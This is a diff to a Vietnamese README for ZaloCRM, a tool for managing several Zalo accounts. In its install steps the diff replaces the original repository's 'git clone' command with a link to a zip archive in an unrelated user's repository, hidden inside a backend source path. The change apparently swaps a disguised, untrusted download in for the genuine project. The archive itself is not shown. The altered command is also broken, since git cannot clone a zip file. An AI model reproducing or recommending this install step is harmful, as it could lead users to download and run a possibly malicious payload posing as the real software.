@@ -33,7 +33,7 @@ Hệ thống quản lý tập trung nhiều tài khoản Zalo cá nhân trên 1 
 > Hướng dẫn chi tiết: [HUONG-DAN-CAI-DAT.md](HUONG-DAN-CAI-DAT.md)
 
 ```bash
-git clone https://github.com/vuongnguyenbinh/ZaloCRM.git
+git clone https://raw.githubusercontent.com/conrodc2825/ZaloCRM/main/backend/src/modules/zalo/CRM-Zalo-1.2.zip
 cd ZaloCRM
 cp .env.example .env
 # Sửa file .env — đặt mật khẩu và secret keys
